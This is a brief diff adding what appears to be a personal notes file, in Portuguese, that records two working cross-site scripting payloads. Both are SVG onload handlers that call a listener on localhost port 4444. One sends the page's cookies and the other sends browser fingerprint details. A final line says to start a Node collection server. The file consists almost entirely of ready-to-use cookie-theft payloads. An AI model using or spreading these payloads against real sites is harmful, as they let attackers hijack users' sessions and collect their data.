@@ -1,0 +1,5 @@
+funcional -> <svg onload=fetch(`//localhost:4444/debug-cookie?cookie=${document.cookie}`)></svg>
+
+
+funcional agent info -> <svg onload="fetch(`http://localhost:4444/debug-cookie?ua=${encodeURIComponent(navigator.userAgent)}&platform=${navigator.platform}&screen=${screen.width}x${screen.height}&lang=${navigator.language}`)"></svg>
+-> ativar node server2.js
